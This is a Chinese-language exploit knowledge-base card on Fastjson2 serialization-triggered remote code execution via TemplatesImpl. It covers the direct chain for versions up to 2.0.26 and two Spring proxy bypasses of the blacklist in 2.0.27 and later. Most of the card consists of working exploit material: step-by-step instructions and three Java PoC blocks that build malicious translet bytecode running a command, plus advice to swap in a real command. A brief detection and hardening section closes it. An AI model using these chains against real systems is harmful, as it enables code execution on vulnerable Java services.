---
id: web-java-deserialization-fastjson2-serialize-getter-templates-proxy-bypass
title: Fastjson2 序列化触发 getter RCE：TemplatesImpl 直用与 ≥2.0.27 双代理黑名单绕过
type: scenario
domain: web
path: web/java/deserialization/fastjson
technique: fastjson2-serialize-getter-templatesimpl-proxy-bypass
tags:
- java
- fastjson2
- deserialization
- serialize
- templatesimpl
- spring-aop
- proxy
- rce
cve: []
severity: critical
confidence: high
status: verified
created: '2026-11-05'
updated: '2026-11-05'
affected_versions: Fastjson2 ≤2.0.26（直接 TemplatesImpl 链）；≥2.0.27（加入 BeanUtils.getters 黑名单后需代理绕过；原文另用 spring-aop 5.3.19 验证）
verification:
  verified_by: verifier-V51
  verified_at: '2026-11-05T09:06:50+08:00'
  notes: 已通读原文并逐张核对45张图：JSONObject.toString→JSONWriter→ObjectWriterCreatorASM→BeanUtils.getters→OWG_1_3_TemplatesImpl.write 调用 getOutputProperties，≤2.0.26 直接链弹计算器；≥2.0.27 ignore 黑名单与 JdkDynamicAopProxy、ObjectFactoryDelegatingInvocationHandler 两条代理绕过及 calc 均与卡一致。注意：原文正文称 Templates 接口未声明 getOutputProperties，但图23显示 javax.xml.transform.Templates 第83行确有 getOutputProperties()，卡内按接口实际声明描述是正确的。未验证点：PoC 均为本地 main（需目标存在可控对象图进入序列化），原文未给远程请求；frontmatter 无 sources/source_url。
url: /docs/web/java/deserialization/fastjson/web-java-deserialization-fastjson2-serialize-getter-templates-proxy-bypass/
draft: false
kb_aliases:
- Fastjson2 RCE
- Fastjson2 序列化触发
- TemplatesImpl getOutputProperties
- BeanUtils getters 黑名单绕过
- JdkDynamicAopProxy 绕过
- ObjectFactoryDelegatingInvocationHandler
- OWG_1_3_TemplatesImpl
---

## 一句话结论

Fastjson2 在序列化对象时会通过 ASM 生成 `OWG_<n>_<Class>` writer 并调用目标类的 getter；把 `TemplatesImpl` 放进 `JSONObject` 后调用 `toString()`，生成的 writer 会调用 `getOutputProperties()`，触发 `TemplatesImpl.newTransformer()` 加载恶意字节码执行——Fastjson2 ≤2.0.26 直接可用；≥2.0.27 在 `BeanUtils.getters` 增加类黑名单后，可用 Spring AOP `JdkDynamicAopProxy` 或 `ObjectFactoryDelegatingInvocationHandler` 对 `Templates` 接口做代理，使 getters 检查落在未黑名单的接口上，调用仍转发到 `TemplatesImpl`，实现绕过 RCE。

## 原理

- 序列化触发链：`JSONObject.toString()` → `JSONWriter.of()`/`write()` → `JSONWriter$Context.getObjectWriter` → `ObjectWriterProvider` → `ObjectWriterCreatorASM.createObjectWriter` → `BeanUtils.getters(objectClass, ...)` 收集 getter → 生成 `OWG_1_3_TemplatesImpl` 类 → `genMethodWrite`/`gwFieldValue`/`genGetObject` 在生成的 `write()` 中插入 `invokevirtual TemplatesImpl.getOutputProperties()` → `TemplatesImpl.getOutputProperties()` → `newTransformer()` → `defineTransletClasses()` → 加载 `_bytecodes` 中的 Evil 类 → 静态初始化块 `Runtime.exec("calc")`。
- 关键点：漏洞发生在 **序列化**（`toString()`/写 JSON）阶段，而不是 `JSON.parseObject` 反序列化阶段；攻击者需要能让服务端序列化一个包含恶意对象的对象图（例如服务端先反序列化/构造对象再回显 JSON、日志打印、缓存序列化等）。
- ≤2.0.26：`BeanUtils.getters(TemplatesImpl.class)` 正常收集 `getOutputProperties`、`getStylesheetDOM`、`getTransletIndex`，`JSONObject.put("1111", templates); jsonObject.toString()` 即弹计算器。
- ≥2.0.27 黑名单：`BeanUtils.ignore(Class)` 对 `com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl`、`AbstractTranslet`、`TransformerFactoryImpl`、`org.apache.commons.collections.functors.ChainedTransformer`、javassist 相关类等直接返回 true，`getters()` 遇到 `!ignore(objectClass)` 不成立就跳过，不再生成 writer。
- 绕过一（JdkDynamicAopProxy）：`getters()` 开头有 `if (Proxy.isProxyClass(objectClass)) { Class[] interfaces = objectClass.getInterfaces(); if (interfaces.length == 1) { getters(interfaces[0], ...); return; } }`。用 `Proxy.newProxyInstance(..., new Class[]{Templates.class}, handler)` 生成只实现 `javax.xml.transform.Templates` 接口的代理；`Templates` 接口不在黑名单中，且接口声明了 `getOutputProperties()`（Fastjson2 会收集接口 getter）。handler 用 `JdkDynamicAopProxy`（构造参数 `AdvisedSupport`，`setTarget(templates)` 且不 `addAdvisor`），`invoke()` 中 `chain.isEmpty()` 成立，走 `AopUtils.invokeJoinpointUsingReflection(target=templates, method=getOutputProperties)`，反射调用到真实 `TemplatesImpl`。
- 绕过二（ObjectFactoryDelegatingInvocationHandler）：该 Spring 内部类 `invoke()` 默认分支执行 `method.invoke(this.objectFactory.getObject(), args)`。先让 `JSONObject` 作为 `InvocationHandler` 代理出 `ObjectFactory`（`JSONObject.invoke` 对无参 getter `getObject` 解析属性名 `object`，返回 `get("object")`），JSONObject 中放入 `templates`；再用 `ObjectFactoryDelegatingInvocationHandler(proxy0)` 作为 handler 代理 `Templates` 接口；序列化时 `getOutputProperties()` → handler → `getObject()` 返回 templates → 反射调用 → RCE。
- 两条链都已在文章本地 PoC 中弹出计算器；远程可利用性取决于目标是否存在可控对象图进入 `toString()` 的路径。

## 触发条件

- 目标使用受影响版本的 Fastjson2（≤2.0.26 直接链；≥2.0.27 需代理绕过）。
- 目标 classpath 存在 `com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl`（JDK 8 常见）及 javassist/xalan（构造恶意 translet）。
- ≥2.0.27 绕过还需 Spring AOP（`spring-aop`，文章 5.3.19）或 Spring Beans（`ObjectFactoryDelegatingInvocationHandler`）。
- 攻击者能让服务端序列化一个包含恶意 `TemplatesImpl`/代理对象的对象图（如先反序列化再回显、日志打印、模板渲染、缓存写入等）。
- 高版本 JDK 模块限制可能影响 `TemplatesImpl` 反射字段赋值，需按目标 JDK 调整。

## 利用步骤

1. 用 javassist 生成继承 `AbstractTranslet` 的 Evil 类，静态初始化块写入 `Runtime.getRuntime().exec("calc")`，取字节码。
2. 反射构造 `TemplatesImpl`，设置 `_bytecodes`、`_name`、`_class=null`、`_tfactory=new TransformerFactoryImpl()`。
3. ≤2.0.26：`JSONObject.put("1111", templates); jsonObject.toString()`。
4. ≥2.0.27（JdkDynamicAopProxy）：构造 `AdvisedSupport`，`setTarget(templates)`，用 `JdkDynamicAopProxy` 作为 handler 代理 `Templates` 接口，把代理对象放入 JSONObject 后 `toString()`。
5. ≥2.0.27（ObjectFactory 链）：JSONObject 放 `object→templates`，作为 `ObjectFactory` 的 handler 代理；再用 `ObjectFactoryDelegatingInvocationHandler` 代理 `Templates` 接口，放入 JSONObject 后 `toString()`。
6. 观察计算器/命令执行；将 `calc` 换成实际命令。

## PoC

```java
// ≤2.0.26 直接链（文章核心代码）
ClassPool classPool = ClassPool.getDefault();
classPool.insertClassPath(new ClassClassPath(AbstractTranslet.class));
CtClass cc = classPool.makeClass("Evil");
cc.makeClassInitializer().insertBefore("Runtime.getRuntime().exec(\"calc\");");
cc.setSuperclass(classPool.get(AbstractTranslet.class.getName()));
byte[][] code = new byte[][]{cc.toBytecode()};

TemplatesImpl templates = new TemplatesImpl();
setFieldValue(templates, "_bytecodes", code);
setFieldValue(templates, "_name", "1111");
setFieldValue(templates, "_class", null);
setFieldValue(templates, "_tfactory", new TransformerFactoryImpl());

JSONObject jsonObject = new JSONObject();
jsonObject.put("1111", templates);
jsonObject.toString(); // 触发 getOutputProperties → RCE
```

```java
// ≥2.0.27 绕过：JdkDynamicAopProxy 代理 Templates 接口
Class<?> clazz = Class.forName("org.springframework.aop.framework.JdkDynamicAopProxy");
Constructor<?> cons = clazz.getDeclaredConstructor(AdvisedSupport.class);
cons.setAccessible(true);
AdvisedSupport advisedSupport = new AdvisedSupport();
advisedSupport.setTarget(templates); // SingletonTargetSource
InvocationHandler handler = (InvocationHandler) cons.newInstance(advisedSupport);
Object proxyObj = Proxy.newProxyInstance(clazz.getClassLoader(),
        new Class[]{Templates.class}, handler);
JSONObject jsonObject = new JSONObject();
jsonObject.put("1111", proxyObj);
jsonObject.toString(); // 触发 RCE
```

```java
// ≥2.0.27 绕过：ObjectFactoryDelegatingInvocationHandler 双代理
JSONObject jsonObject0 = new JSONObject();
jsonObject0.put("object", templates);
Object proxy0 = Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(),
        new Class[]{ObjectFactory.class}, (InvocationHandler) jsonObject0);
Constructor<?> c = Class.forName("org.springframework.beans.factory.support.AutowireUtils$ObjectFactoryDelegatingInvocationHandler")
        .getDeclaredConstructor(ObjectFactory.class);
c.setAccessible(true);
Object proxy1 = Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(),
        new Class[]{Templates.class}, (InvocationHandler) c.newInstance(proxy0));
JSONObject jsonObject = new JSONObject();
jsonObject.put("1111", proxy1);
jsonObject.toString(); // 触发 RCE
```

```text
# 预期：弹出计算器；调试可见 OWG_1_3_TemplatesImpl.write() 调用 getOutputProperties()，
# 最终 TemplatesImpl.newTransformer → Evil.<clinit> → Runtime.exec("calc")。
```

## 变体与关联

- 变体：`BeanUtils.ignore` 黑名单还拦截 `AbstractTranslet`、`TransformerFactoryImpl`、`ChainedTransformer`、javassist 类；任何未列入黑名单且能转发到危险对象的接口/代理都可作为绕过的“外壳”。
- 变体：除 `Templates` 外，其他声明危险 getter 的接口/代理也可尝试；核心是让 Fastjson2 的 getter 收集落在未黑名单的接口上，而实际调用转发到黑名单类。
- 关联：[[web-java-deserialization-interface-proxy-templatesimpl-blacklist-bypass]]（接口代理绕过 TemplatesImpl 黑名单的通用模式，本卡补充 Fastjson2 序列化 getter 触发与 Spring 双代理细节）；[[web-java-deser-fastjson-jdbc-rowset]]（Fastjson JdbcRowSetImpl JNDI 链）；[[web-java-deser-fastjson-c3p0-jndiref-jndi]]（Fastjson C3P0 JNDI 链）；[[web-java-deser-commonscollections-cc6-cc3-templatesimpl]]（TemplatesImpl 字节码执行链）；[[web-java-deserialization-jndi-high-version-beanfactory-el]]（高版本 JDK 的替代利用）。
- 边界：文章 PoC 均为本地 `main` 方法（`JSONObject.put` + `toString`），未给出远程 JSON 请求/服务端对象图构造方式；实际远程利用需要目标存在“可控对象进入序列化”的入口。≥2.0.27 的具体小版本原文未列，只说明黑名单从该版本开始。

## 检测与防御

- 检测：审计 Fastjson2 序列化路径（`JSON.toJSONString`、`JSONObject.toString`、日志/缓存序列化）是否可能处理不可信对象；监控 classpath 中的 `TemplatesImpl`、`JdkDynamicAopProxy`、`ObjectFactoryDelegatingInvocationHandler` 异常组合；关注生成的 `OWG_*` writer 调用 `getOutputProperties`。
- 修复：升级 Fastjson2 到包含黑名单修复的版本并关注后续绕过；禁止序列化不可信对象图；对 `JSONObject` 内容做类型白名单。
- 加固：升级 JDK 并限制 `TemplatesImpl` 反射/模块访问；移除不必要的 xalan/javassist/Spring AOP 依赖；使用 `ObjectInputFilter`/序列化白名单；日志与回显前对对象做安全序列化（避免调用 getter）。
